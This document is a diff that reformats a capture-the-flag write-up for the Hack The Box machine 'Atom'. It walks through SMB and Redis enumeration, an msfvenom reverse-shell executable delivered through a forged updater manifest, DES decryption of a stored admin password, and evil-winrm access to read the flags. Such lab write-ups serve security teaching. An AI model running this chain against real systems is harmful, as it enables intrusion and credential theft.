@@ -26,7 +26,7 @@
 
 \## Full TCP Scan
 
-```swift
+```
 ⛩\> nmap -sT -Pn -sV -sC -v -oA enum 10.129.137.129
 Nmap scan report for atom.htb (10.129.137.129)
 Host is up (0.28s latency).
@@ -86,7 +86,7 @@ Nmap reveals that target is running HTTP/s and SMB service on Windows 10 Pro OS.
 
 \## Full Port scan
 
-```swift
+```
 ⛩\> nmap -p- -Pn -v 10.129.137.129
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-19 02:57 EDT
@@ -108,7 +108,7 @@ As you can see full port scan revealed Redis (6379) and Wsman (5985). Let’s pe
 
 \##Service Scan
 
-```swift
+```
 ⛩\> nmap -p 80,135,445,5985,6379,7680 -sC -sV -Pn -v 10.129.137.129
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-19 03:35 EDT
@@ -156,7 +156,7 @@ Let’s do SMB enumeration for any shared folders.
 
 \##SMB Share Enumeration
 
-```swift
+```
 ⛩\> nmap -p445 --script smb-enum-shares 10.129.137.129
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-19 03:54 EDT
 Nmap scan report for atom.htb (10.129.137.129)
@@ -194,7 +194,7 @@ We got one shared directory which is worth looking into. Let’s access it via S
 
 \##Access SMB share and download PDF
 
-```swift
+```
 ⛩\> smbclient //10.129.137.129/Software_Updates -N
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -205,7 +205,7 @@ smb: \> ls
   client3                             D        0  Mon Apr 19 03:53:14 2021
   UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 07:18:08 2021
 
-		4413951 blocks of size 4096. 1361805 blocks available
+        4413951 blocks of size 4096. 1361805 blocks available
 smb: \> get UAT_Testing_Procedures.pdf
 getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (24.4 KiloBytes/sec) (average 24.4 KiloBytes/sec)
 smb: \>
@@ -233,7 +233,7 @@ Let’s build our reverse executable via msfvenom and name it as up'date.exe
 
 \## Create reverse shell
 
-```swift
+```
 ⛩\> msfvenom -p windows/x64/shell_reverse_tcp -f exe lhost=10.10.14.42 lport=1234 -o "up'date.exe"
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -247,7 +247,7 @@ Now we need to generate signature hash of this up’date.exe. This can be easily
 
 \## Create signature
 
-```swift
+```
 ⛩\> shasum -a 512 up\'date.exe | cut -d " " -f1 | xxd -r -p | base64
 jAUiMEfUaQSD6tvtKmjG4kk9fJo/lyZBbP0/16id9lPwdyqCw5rKvbvJaCbmLE/1QMukQ8WBn/hDdL81I/UOqQ==
 ```
@@ -256,7 +256,7 @@ Now create a YML file and add the details of the file name, signature and versio
 
 \## Create yml file
 
-```swift
+```
 ⛩\> cat latest.yml
 version: 1.0.1
 path: up'date.exe
@@ -265,7 +265,7 @@ sha512: jAUiMEfUaQSD6tvtKmjG4kk9fJo/lyZBbP0/16id9lPwdyqCw5rKvbvJaCbmLE/1QMukQ8WB
 
 \## Set netcat listener
 
-```swift
+```
 ⛩\> nc -lvnp 1234
 listening on [any] 1234 ...
 ```
@@ -274,7 +274,7 @@ Now we need to upload executable and yml file to SMB client folder.
 
 \## Upload reverse shell and yml
 
-```swift
+```
 ⛩\> smbclient //atom.htb/Software_updates -N
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -285,7 +285,7 @@ smb: \> ls
   client3                             D        0  Tue Apr 20 02:52:08 2021
   UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 07:18:08 2021
 
-		4413951 blocks of size 4096. 1364219 blocks available
+        4413951 blocks of size 4096. 1364219 blocks available
 smb: \> cd client1
 smb: \client1\> put up'date.exe
 putting file up'date.exe as \client1\up'date.exe (8.5 kb/s) (average 8.5 kb/s)
@@ -298,7 +298,7 @@ Upon upload we’d get a reverse connection on our machine.
 
 \## Reverse Connection
 
-```swift
+```
 ⛩\> nc -lvnp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.42] from (UNKNOWN) [10.129.99.96] 51066
@@ -314,7 +314,7 @@ C:\WINDOWS\system32>
 
 \## User Flag
 
-```swift
+```
 PS C:\> cd users/jason/desktop
 cd users/jason/desktop
 PS C:\users\jason\desktop> get-childitem
@@ -342,7 +342,7 @@ PS C:\users\jason\desktop>
 
 In the current user directory, we can find portable kanban application. It is a physical board to manage your daily tasks. It is possible to create a common board and share information with colleagues, but for that they should have Redis server. As we already know from our initial enumeration that Redis is already present on target. Let’s see the configuration file of kanban.
 
-```swift
+```
 PS C:\Users\jason\downloads> get-childitem
 get-childitem
 
@@ -394,7 +394,7 @@ For that we need to read the configuration file of kanban.
 
 \## Read the config file
 
-```swift
+```
 PS C:\Users\jason\Downloads\PortableKanban> get-content PortableKanban.cfg
 get-content PortableKanban.cfg
 
@@ -407,7 +407,7 @@ It looks like redis is being used with kanban. Let’s access Redis configuratio
 
 \## Read redis config file
 
-```swift
+```
 PS C:\Program Files\redis> get-childitem
 get-childitem
 
@@ -447,7 +447,7 @@ We got the Redis credentials, let’s access Redis via our machine. FOr that we 
 
 \## Install Redis-Tools
 
-```swift
+```
 ⛩\> sudo apt install redis-tools
 ```
 
@@ -455,7 +455,7 @@ Let’s authenticate via found credentials and look for any stored keys.
 
 \## Access remote redis
 
-```swift
+```
 ⛩\> redis-cli -h atom.htb -a 'kidvscat_yes_kidvscat'
 Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
 atom.htb:6379> KEYS *
@@ -478,22 +478,22 @@ We need to modify our code to accept our key.
 
 \## Modify code 1
 
-```swift
+```
 #!/bin/python3
 import json
 import base64
 from des import * #python3 -m pip install des
 
 def decode(hash):
-	hash = base64.b64decode(hash.encode('utf-8'))
-	key = DesKey(b"7ly6UznJ")
-	return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')
+    hash = base64.b64decode(hash.encode('utf-8'))
+    key = DesKey(b"7ly6UznJ")
+    return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')
 print(decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'))
 ```
 
 \## Modify code 2
 
-```swift
+```
 #!/bin/python3
 import json
 import base64
@@ -510,14 +510,14 @@ except:
 
 \## Run code
 
-```swift
+```
 ⛩\> python3 kan1.py
 kidvscat_admin_@123
 ```
 
 \## Access Admin and read flag
 
-```swift
+```
 ⛩\> evil-winrm -i atom.htb -u administrator -p 'kidvscat_admin_@123'
 
 Evil-WinRM shell v2.3
@@ -527,4 +527,3 @@ Info: Establishing connection to remote endpoint
 [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> get-content ../desktop/root.txt
 9dc8211d9cfb7397269a77cc9f3dfa24
 ```
-
